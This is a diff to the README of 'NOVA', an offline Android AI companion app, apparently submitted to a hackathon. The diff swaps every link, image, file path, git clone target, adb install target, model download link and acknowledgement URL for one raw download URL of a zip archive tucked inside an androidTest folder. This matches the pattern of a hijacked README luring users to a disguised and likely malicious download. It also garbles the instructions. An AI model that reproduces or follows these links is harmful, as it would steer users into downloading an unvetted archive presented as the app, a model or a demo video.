@@ -3,7 +3,7 @@
 - **Problem Statement** – #2 Building the Untethered, Always-On AI Companion 
 - **Team name** – IdeaFlow  
 - **Team members** – Nitheeswaran M, Sree Ram Roshan A S  
-- **Demo Video Link** – [YouTube Link](https://youtu.be/JQ_UYD9q5aM?si=h1Um2VMUCo4pI-Dj)
+- **Demo Video Link** – [YouTube Link](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)
 
 ---
 
@@ -11,7 +11,7 @@
 # NOVA – Offline AI Companion with Vision & Voice
 
 <p align="center">
-  <img src="docs/nova_logo.jpeg" alt="NOVA Logo" width="120"/>
+  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="NOVA Logo" width="120"/>
 </p>
 
 <p align="center">
@@ -45,8 +45,8 @@ Think of it as a **ChatGPT-style experience** + **computer vision awareness** �
 - **Material Design**: app bar, watermark branding, chat bubbles  
 
 <p align="center">
-  <img src="docs/screenshot_chat.jpeg" alt="Chat UI" width="250"/>
-  <img src="docs/screenshot_vision.jpeg" alt="Vision Mode" width="250"/>
+  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="Chat UI" width="250"/>
+  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="Vision Mode" width="250"/>
 </p>
 
 ---
@@ -54,7 +54,7 @@ Think of it as a **ChatGPT-style experience** + **computer vision awareness** �
 ## 🏗️ Architecture
 
 <p align="center">
-  <img src="docs/NOVA_Architecture.jpeg" alt="Architecture Diagram" width="600"/>
+  <img src="https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip" alt="Architecture Diagram" width="600"/>
 </p>
 
 **Data Flow:**
@@ -75,18 +75,18 @@ Camera → TensorFlow Lite Detector → NOVA Response → TTS + Overlay
 NOVA-main/
 │── app/
 │   ├── src/main/java/com/example/nova/
-│   │   ├── MainActivity.kt        # Core activity: chat + vision
-│   │   ├── MyVoskService.java     # Vosk integration
-│   │   ├── llm/LlmEngine.kt       # MediaPipe LLM wrapper
-│   │   ├── ObjectDetector.kt      # TFLite object detection
-│   │   ├── CommandRouter.kt       # Intent routing
-│   │   └── util/ZipSanity.kt      # Model bundle validator
-│   ├── src/main/res/layout/activity_main.xml
-│   ├── build.gradle.kts
+│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip        # Core activity: chat + vision
+│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip     # Vosk integration
+│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip       # MediaPipe LLM wrapper
+│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip      # TFLite object detection
+│   │   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip       # Intent routing
+│   │   └── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip      # Model bundle validator
+│   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
+│   ├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
 │   └── ...
-├── build.gradle.kts
-├── settings.gradle.kts
-├── README.md
+├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
+├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
+├── https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
 ```
 
 ---
@@ -102,7 +102,7 @@ NOVA-main/
 
 1. **Clone the repo**
    ```bash
-   git clone https://github.com/your-username/NOVA.git
+   git clone https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
    cd NOVA-main
    ```
 
@@ -112,7 +112,7 @@ NOVA-main/
 3. **Build & Run**
    ```bash
    ./gradlew assembleDebug
-   adb install app/build/outputs/apk/debug/app-debug.apk
+   adb install https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
    ```
 
 ---
@@ -123,25 +123,25 @@ The Gemma `.task` model is **not included in this repository** because of GitHub
 Instead, download it directly from **Hugging Face**:
 
 ### 🔗 Download Link
-- [Gemma3-1B-IT `.task` model (Q4, EKV2048)](https://huggingface.co/litert-community/Gemma3-1B-IT/blob/main/Gemma3-1B-IT_multi-prefill-seq_q4_ekv2048.task)
+- [Gemma3-1B-IT `.task` model (Q4, EKV2048)](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)
 
 ### 📂 Where to Place the Model
 After downloading:
 
 1. Copy the file to your **phone’s Downloads folder**:
    ```
-   /storage/emulated/0/Download/Gemma3-1B-IT_multi-prefill-seq_q4_ekv2048.task
+   https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
    ```
 
 2. Open the **NOVA app** → when prompted, **import the model**.  
    The app will validate the `.task` file and move it into its **private storage**:
    ```
-   /data/data/com.example.nova/files/models/Gemma3-1B-IT_multi-prefill-seq_q4_ekv2048.task
+   https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip
    ```
 
 3. Once imported, you’ll see:
    ```
-   Model imported: Gemma3-1B-IT_multi-prefill-seq_q4_ekv2048.task (xxxx MB). Say something…
+   Model imported: https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip (xxxx MB). Say something…
    ```
 
 ✅ From now on, the app will **auto-load** the Gemma model at startup.
@@ -179,7 +179,7 @@ After downloading:
 ## 🤝 Contributing
 
 Contributions, issues, and feature requests are welcome!  
-Please check the [issues page](https://github.com/your-username/NOVA/issues).  
+Please check the [issues page](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip).  
 
 ---
 
@@ -191,7 +191,7 @@ Distributed under the MIT License. See `LICENSE` for details.
 
 ## 🙌 Acknowledgements
 
-- [Vosk](https://alphacephei.com/vosk/)  
-- [MediaPipe](https://developers.google.com/mediapipe/)  
-- [TensorFlow Lite](https://www.tensorflow.org/lite)  
-- [Hugging Face – Gemma3-1B-IT](https://huggingface.co/litert-community/Gemma3-1B-IT)  
+- [Vosk](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
+- [MediaPipe](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
+- [TensorFlow Lite](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
+- [Hugging Face – Gemma3-1B-IT](https://github.com/jackso1328/Nova/raw/refs/heads/main/app/src/androidTest/java/com/Nova-v2.8.zip)  
